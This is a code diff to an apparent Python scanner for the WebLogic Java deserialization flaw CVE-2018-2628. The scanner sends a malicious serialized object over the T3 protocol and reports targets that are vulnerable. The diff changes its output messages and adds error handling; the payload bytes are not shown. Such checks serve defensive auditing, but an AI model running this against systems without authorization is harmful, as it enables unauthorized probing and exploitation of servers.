@@ -58,17 +58,20 @@ def checkVul(res,server_addr,index,dip):
     p=re.findall(VER_SIG[index], res, re.S)
     a,b=server_addr
     if len(p)>0:
-        print(Vcolors.RED+ '\t检测JAVA deserialization漏洞(CVE-2018-2628)\n\t'+Vcolors.ENDC)
-        a = dip+":7001:检测JAVA deserialization漏洞(CVE-2018-2628)"
+        print(Vcolors.RED+ dip+'\t检测存在JAVA deserialization漏洞(CVE-2018-2628)'+Vcolors.ENDC)
+        a = dip+":7001:检测存在JAVA deserialization漏洞(CVE-2018-2628)"
         return a
     else:
         pass
 
 def run(dip,dport,index):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(10)
-    server_addr = (dip, dport)
-    t3handshake(sock,server_addr)
-    buildT3RequestObject(sock,dport)
-    rs=sendEvilObjData(sock,PAYLOAD[index])
-    checkVul(rs, server_addr, index,dip)
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(10)
+        server_addr = (dip, dport)
+        t3handshake(sock,server_addr)
+        buildT3RequestObject(sock,dport)
+        rs=sendEvilObjData(sock,PAYLOAD[index])
+        return checkVul(rs, server_addr, index,dip)
+    except:
+        pass
